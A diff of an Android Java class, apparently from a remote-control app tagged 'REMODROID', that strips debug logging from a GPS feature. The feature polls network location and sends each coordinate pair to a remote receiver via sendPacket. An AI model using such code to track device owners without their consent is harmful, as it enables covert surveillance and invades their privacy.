@@ -24,18 +24,13 @@ public class GPS extends Feature {
     @Override
     public void AsyncTaskFunc(String Params) {
         try {
-            Log.e("REMODROID","GPS 1");
             LocationManager mLocationManager = (LocationManager) App.get().getApplicationContext().getSystemService(LOCATION_SERVICE);
 
-            Log.e("REMODROID","GPS 2");
 
             //mLocationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, mLocationListener,Looper.getMainLooper());
             if (mLocationManager != null) {
                 mLocationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 5, mLocationListener,Looper.getMainLooper());
-            }else {
-                Log.e("REMODROID","GPS 10");
             }
-            Log.e("REMODROID","GPS 3");
         }catch (SecurityException | NullPointerException e){
             Log.e("REMODROID","GPS Error " +e.getMessage());
         }
@@ -53,13 +48,10 @@ public class GPS extends Feature {
     private final LocationListener mLocationListener = new LocationListener() {
         @Override
         public void onLocationChanged(final Location location) {
-            //your code here
-            Log.e("REMODROID","GPS 4");
             try {
                 sendPacket((
                         location.getLatitude() + "/" +location.getLongitude()).getBytes("UTF-8"));
                 Log.d("REMODROID",location.getLatitude() + "/" +location.getLongitude());
-                Log.e("REMODROID","GPS 5");
             } catch (UnsupportedEncodingException e) {
                 Log.e("REMODROID","GPS Send Error");
             }
